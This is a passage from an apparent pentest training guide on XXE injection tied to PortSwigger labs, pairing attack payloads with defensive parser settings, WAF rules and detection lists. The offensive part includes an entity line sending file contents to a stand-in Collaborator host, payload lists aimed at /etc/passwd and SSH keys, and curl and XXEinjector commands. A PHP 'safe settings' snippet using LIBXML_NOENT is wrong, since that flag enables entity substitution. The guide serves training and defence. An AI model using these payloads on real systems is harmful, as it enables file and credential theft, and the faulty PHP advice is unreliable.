<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;
```

### Burp Intruder for XXE

#### Fuzzing File Paths

**Payload positions:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///§target§"> ]>
<root>&xxe;</root>
```

**Payload list:**
```
etc/passwd
etc/hostname
etc/hosts
proc/self/environ
var/www/html/config.php
home/user/.ssh/id_rsa
```

**Attack type:** Sniper
**Grep - Extract:** Match error messages or file content patterns

#### DTD Path Discovery

**Payload:**
```xml
<!ENTITY % local_dtd SYSTEM "file:///§path§">
%local_dtd;
```

**Wordlist:**
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/sgml/html/dtd/html.dtd
```

**Grep - Match:** Look for absence of "File not found" errors

### Burp Scanner (Professional)

**Automatic XXE Detection:**

1. **Passive scanning:**
   - Identifies XML input points
   - Flags potential XXE locations

2. **Active scanning:**
   - Tests for file retrieval
   - Tests for SSRF
   - Tests for blind XXE with Collaborator
   - Tests for DoS via entity expansion

**Running scan:**
```
Target → Site map → Right-click URL → "Scan"
Dashboard → Tasks → View scan results
```

**Manual scan configuration:**
```
Scanner → Scan configuration
→ Issues reported → XML external entity injection
→ Select detection methods (file retrieval, out-of-band, etc.)
```

### Burp Extensions for XXE

**Useful extensions:**

1. **Content Type Converter:**
   - Automatically convert between formats
   - Test XXE on JSON endpoints (JSON to XML)

2. **XML External Entity Injector:**
   - Automated XXE payload injection
   - Multiple payload variations

3. **Collaborator Everywhere:**
   - Injects Collaborator payloads in all parameters
   - Detects out-of-band XXE automatically

4. **Logger++:**
   - Enhanced logging for XXE testing
   - Track payload variations and responses

**Installing extensions:**
```
Extender → BApp Store → Search "XXE" or "XML"
```

---

## Common Mistakes & Troubleshooting

### Syntax Errors

| Mistake | Correct |
|---------|---------|
| `<!ENTITY xxe SYSTEM "...">` | `<!ENTITY xxe SYSTEM "...">` ✓ |
| Missing DOCTYPE | Must include `<!DOCTYPE>` |
| `&xxe` (no semicolon) | `&xxe;` ✓ |
| `%xxe;` in XML content | Use in DTD only; `&xxe;` in content |
| Wrong entity type (& vs %) | `&` for general, `%` for parameter |

### File Path Issues

| Issue | Solution |
|-------|----------|
| `file://etc/passwd` | Use 3 slashes: `file:///etc/passwd` |
| Backslashes on Linux | Use forward slashes: `/` |
| Wrong OS paths | Linux: `/etc/`, Windows: `C:/windows/` |
| URL encoding | May need encoding in some contexts |

### Payload Not Working

**Checklist:**

1. **Is XML being parsed?**
   - Check Content-Type header
   - Verify endpoint accepts XML
   - Try different content types

2. **Are entities processed?**
   - Parser may have entities disabled
   - Try different entity types (general vs parameter)
   - Test with XInclude

3. **Is output visible?**
   - For blind XXE, use out-of-band techniques
   - Check error messages
   - Monitor Collaborator

4. **Firewall blocking?**
   - Out-of-band may be blocked
   - Try error-based techniques
   - Use local DTD repurposing

### No Error Messages

**Solutions:**

1. **Use out-of-band detection:**
   ```xml
   <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe; ]>
   ```

2. **Try timing attacks:**
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://slow-endpoint"> ]>
   <!-- Monitor response time -->
   ```

3. **Check logs:**
   - Server may log errors even if not displayed
   - Request application logs

### Collaborator Not Receiving Interactions

**Troubleshooting:**

1. **Firewall/WAF blocking:**
   - Outbound HTTP/DNS may be filtered
   - Try different protocols (HTTP vs HTTPS)
   - Try FTP protocol

2. **Polling delay:**
   - Wait 10-30 seconds before polling
   - Some requests are asynchronous

3. **Wrong payload:**
   - Verify Collaborator domain is correct
   - Check entity invocation (`%xxe;` or `&xxe;`)
   - Ensure XML is syntactically valid

4. **Parser restrictions:**
   - Try parameter entities instead of general
   - Use alternative techniques (error-based, local DTD)

### Special Characters Breaking Payload

**Problem:** File contents contain XML special characters (`<`, `>`, `&`)

**Solutions:**

1. **PHP filter with base64:**
   ```xml
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
   ```

2. **CDATA sections (if supported):**
   ```xml
   <![CDATA[...file contents...]]>
   ```

3. **Choose different files:**
   - Target simple text files
   - Avoid files with special characters

4. **Accept partial data:**
   - Extract visible portions
   - Content may be truncated at special chars

### Parser-Specific Issues

**libxml2 (PHP, Python):**
- Entities disabled by default in recent versions
- Enable for testing: `libxml_disable_entity_loader(false);`

**Java (JAXP, Xerces):**
- Entities often enabled by default
- Look for `DocumentBuilderFactory` configurations

**.NET:**
- `XmlDocument` - Entities enabled by default (older .NET)
- `XDocument` - Entities disabled by default (.NET 4.5+)

**Python:**
- `xml.etree.ElementTree` - Safe by default (no external entities)
- `lxml` - Can enable entities with parser flags

---

## Prevention & Defense

### Disable External Entities

**PHP:**
```php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Or use DOMDocument with safe settings
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

**Java:**
```java
// JAXP
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);

// SAX Parser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python:**
```python
# lxml
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)

# xml.etree.ElementTree (safe by default)
import xml.etree.ElementTree as ET
tree = ET.parse(xml_file)  # Doesn't resolve external entities
```

**.NET:**
```csharp
// XmlDocument
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // Disable external entity resolution
doc.LoadXml(xmlString);

// XmlReader (safer)
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
using (XmlReader reader = XmlReader.Create(stream, settings)) {
    // Parse XML
}
```

**Node.js:**
```javascript
// libxmljs
const libxmljs = require('libxmljs');
const xml = libxmljs.parseXml(xmlString, {
  noent: false,  // Don't substitute entities
  nonet: true    // Disable network access
});

// xml2js (safe by default)
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
  // No entity expansion by default
});
```

### Disable DTD Processing

**Completely disable DOCTYPE:**
```java
// Java - Most secure approach
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

```python
# Python
parser = etree.XMLParser(load_dtd=False, no_network=True)
```

```csharp
// .NET
settings.DtdProcessing = DtdProcessing.Prohibit;
```

### Input Validation

**Validate XML structure:**
```python
import re

def is_safe_xml(xml_string):
    # Reject if contains DOCTYPE
    if re.search(r'<!DOCTYPE', xml_string, re.IGNORECASE):
        return False

    # Reject if contains ENTITY declarations
    if re.search(r'<!ENTITY', xml_string, re.IGNORECASE):
        return False

    # Reject if contains SYSTEM keyword
    if re.search(r'SYSTEM', xml_string, re.IGNORECASE):
        return False

    return True

if not is_safe_xml(user_input):
    raise ValueError("Potentially malicious XML detected")
```

**Whitelist allowed elements:**
```python
from lxml import etree

# Define allowed schema
schema = etree.XMLSchema(etree.parse('allowed_schema.xsd'))

# Validate against schema
try:
    schema.assertValid(xml_doc)
except etree.DocumentInvalid:
    raise ValueError("XML doesn't match allowed schema")
```

### Use Safe Parsers

**Prefer parsers with entities disabled by default:**

**Safe:**
- Python: `xml.etree.ElementTree` (default config)
- .NET: `XDocument`, `XmlReader` with `DtdProcessing.Prohibit`
- Node.js: `xml2js` (default config)

**Requires configuration:**
- PHP: `libxml` (must disable explicitly)
- Java: JAXP, Xerces (must disable explicitly)
- Python: `lxml` (must configure parser)

### Web Application Firewalls (WAF)

**ModSecurity rules:**
```apache
# Block DOCTYPE declarations
SecRule REQUEST_BODY "@rx (?i:<!DOCTYPE)" \
    "id:1000,phase:2,deny,status:403,msg:'DOCTYPE detected'"

# Block ENTITY declarations
SecRule REQUEST_BODY "@rx (?i:<!ENTITY)" \
    "id:1001,phase:2,deny,status:403,msg:'ENTITY detected'"

# Block SYSTEM keyword
SecRule REQUEST_BODY "@rx (?i:SYSTEM)" \
    "id:1002,phase:2,deny,status:403,msg:'SYSTEM keyword detected'"
```

**OWASP Core Rule Set (CRS):**
- Rule ID 941310: XML External Entity (XXE) Injection
- Rule ID 941320: XML Entity Expansion Attack

### Network Segmentation

**Prevent SSRF:**
- Block outbound connections from app servers
- Use egress filtering
- Restrict access to metadata endpoints

**Firewall rules:**
```bash
# Block access to cloud metadata
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block internal network access
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
```

### Monitoring and Detection

**Log analysis:**
```python
# Monitor for XXE indicators in logs
indicators = [
    'DOCTYPE',
    'ENTITY',
    'SYSTEM',
    'file://',
    '169.254.169.254',  # AWS metadata
    '/etc/passwd',
    'xml external entity'
]

for log_entry in logs:
    if any(indicator in log_entry.lower() for indicator in indicators):
        alert("Potential XXE attack detected")
```

**SIEM rules:**
- Alert on multiple XML parsing errors
- Detect access attempts to sensitive files
- Monitor for DNS queries to suspicious domains
- Track unusual outbound connections

### Secure Development Practices

**Code review checklist:**
- [ ] XML parser configuration reviewed
- [ ] External entities disabled
- [ ] DTD processing disabled or restricted
- [ ] Input validation implemented
- [ ] Error messages don't leak sensitive info
- [ ] Least privilege for application user
- [ ] Network egress restrictions in place

**Testing:**
```bash
# Automated security testing
zap-cli quick-scan --spider https://target.com
zap-cli active-scan https://target.com

# Manual testing with sample payloads
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

---

## References & Resources

### OWASP Resources

**OWASP Cheat Sheets:**
- [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)

**OWASP Testing Guide:**
- [Testing for XML Injection (OTG-INPVAL-008)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

**OWASP Top 10:**
- A03:2021 – Injection (includes XXE)
- A04:2017 – XML External Entities (XXE) - dedicated category in 2017

### Industry Standards

**CWE (Common Weakness Enumeration):**
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-776: Improper Restriction of Recursive Entity References in DTDs](https://cwe.mitre.org/data/definitions/776.html)

**MITRE ATT&CK:**
- [T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

**CAPEC (Common Attack Pattern Enumeration):**
- [CAPEC-221: Data Serialization External Entities Blowup](https://capec.mitre.org/data/definitions/221.html)
- [CAPEC-228: DTD Injection](https://capec.mitre.org/data/definitions/228.html)

### CVE Examples

**Notable XXE Vulnerabilities:**

1. **Apache Struts (CVE-2017-9805)**
   - CVSS: 8.1 (High)
   - XXE in REST plugin XML handling
   - Led to Equifax breach

2. **SAP NetWeaver (CVE-2020-6287)**
   - CVSS: 10.0 (Critical)
   - XXE in LM Configuration Wizard
   - Pre-authentication RCE

3. **Microsoft Office (CVE-2018-0798)**
   - CVSS: 7.8 (High)
   - XXE in Office file parsing
   - Affects DOCX, XLSX, PPTX

4. **Ruby OpenID (CVE-2013-1812)**
   - XXE in XML signature verification
   - Authentication bypass

5. **Facebook (2014)**
   - XXE in Word document upload
   - $30,000 bug bounty

### Testing Tools

**Automated Scanners:**
- Burp Suite Professional (XXE Scanner)
- OWASP ZAP (XXE Extension)
- Acunetix
- Netsparker
- AppSpider

**XXE-Specific Tools:**
```bash
# XXEinjector - Automated XXE exploitation
git clone https://github.com/enjoiz/XXEinjector
perl XXEinjector.pl --host=target.com --file=request.txt

# XXExploiter - Multi-featured XXE exploitation
git clone https://github.com/luisfontes19/xxexploiter

# dtd-finder - Discover local DTD files
git clone https://github.com/GoSecure/dtd-finder
```

**Payload Lists:**
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [SecLists - XXE Payloads](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)

### Research Papers & Articles

**Academic Research:**

1. **"XML Signature Wrapping Attack"** - McIntosh & Gudgin (2005)
   - First documented XXE exploitation techniques
   - Focus on XML signature verification bypass

2. **"Hunting Vulnerabilities in XML processing"** - Timothy Morgan (2014)
   - Comprehensive XXE attack taxonomy
   - Blind XXE out-of-band techniques

3. **"XXE in the Wild"** - OWASP AppSec EU (2018)
   - Real-world case studies
   - Detection and prevention strategies

**Technical Blogs:**
- [PortSwigger Research - XXE](https://portswigger.net/web-security/xxe)
- [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [Acunetix Blog - XXE Attacks](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)

### Training & Practice

**Vulnerable Applications:**
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe) - All 9 XXE labs
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - XXE lessons
- [bWAPP](http://www.itsecgames.com/) - XXE challenges
- [DVWA](https://github.com/digininja/DVWA) - XML External Entities

**CTF Challenges:**
- HackTheBox - Machines with XXE vulnerabilities
- TryHackMe - XXE rooms
- PentesterLab - XXE exercises

### Secure Coding Guidelines

**Language-Specific:**

**Java:**
- [Oracle Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html)
- [OWASP - XML External Entity Prevention - Java](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java)

**PHP:**
- [PHP: XML External Entity (XXE) Prevention](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php)

**Python:**
- [Python XML Vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities)

**.NET:**
- [Microsoft - Secure XML Processing](https://docs.microsoft.com/en-us/dotnet/standard/security/secure-xml-processing)

### Compliance & Frameworks

**PCI DSS:**
- Requirement 6.5.1: Injection flaws (including XXE)
- Regular security testing required

**NIST:**
- [SP 800-95: Guide to Secure Web Services](https://csrc.nist.gov/publications/detail/sp/800-95/final)

**ISO 27001:**
- A.14.2.5: Secure system engineering principles

### Community Resources

**Forums & Discussion:**
- [Reddit /r/netsec](https://www.reddit.com/r/netsec/)
- [OWASP Slack](https://owasp.org/slack/invite)
- [BugCrowd Forum](https://forum.bugcrowd.com/)

**Bug Bounty Platforms:**
- HackerOne - Many XXE submissions
- Bugcrowd
- Synack
- Intigriti

**Conference Talks:**
- BlackHat: "XML Out-Of-Band Data Retrieval" - Timothy Morgan
- DEFCON: "Modern XML Attacks"
- OWASP AppSec: XXE presentations

---

## Summary

This comprehensive guide covered all 9 PortSwigger XXE labs with detailed exploitation techniques:

1. ✅ **Basic File Retrieval** - Classic XXE to read `/etc/passwd`
2. ✅ **SSRF via XXE** - Access AWS EC2 metadata and extract credentials
3. ✅ **Blind XXE Detection** - Out-of-band interaction with Burp Collaborator
4. ✅ **Parameter Entities** - Bypass entity restrictions
5. ✅ **Data Exfiltration** - Blind XXE with external DTD hosting
6. ✅ **Error-Based XXE** - Exfiltrate data via error messages
7. ✅ **XInclude** - XXE without DOCTYPE control
8. ✅ **SVG Upload** - XXE via image file processing
9. ✅ **Local DTD Repurposing** - Advanced error-based technique

### Key Takeaways

**Attack Progression:**
```
Basic XXE → Blind XXE → Out-of-Band → Error-Based → Advanced (Local DTD)
```

**When to Use Each Technique:**
- **Direct output visible?** → Basic XXE (Labs 1-2)
- **No output, egress allowed?** → Out-of-band (Labs 3-5)
- **Errors visible, egress blocked?** → Error-based (Lab 6)
- **Can't control DOCTYPE?** → XInclude (Lab 7)
- **File upload with XML?** → SVG/DOCX XXE (Lab 8)
- **Everything blocked?** → Local DTD repurposing (Lab 9)

**Prevention Priority:**
1. Disable external entities in XML parser
2. Disable DTD processing entirely
3. Use safe parsers
4. Input validation
5. Network segmentation
6. Monitoring and detection

### Next Steps

**For Practitioners:**
- Complete all 9 labs in PortSwigger Academy
- Practice on vulnerable apps (WebGoat, bWAPP)
- Test real applications with proper authorization
- Report findings responsibly

**For Defenders:**
- Audit XML parser configurations
- Implement secure coding guidelines
- Deploy WAF rules for XXE
- Enable monitoring and detection
- Regular security testing

---

**Document Version:** 1.0
**Last Updated:** 2026-01-09
**Author:** Pentest Skill - XXE Mastery Module
**License:** Educational purposes only - Use responsibly with authorization
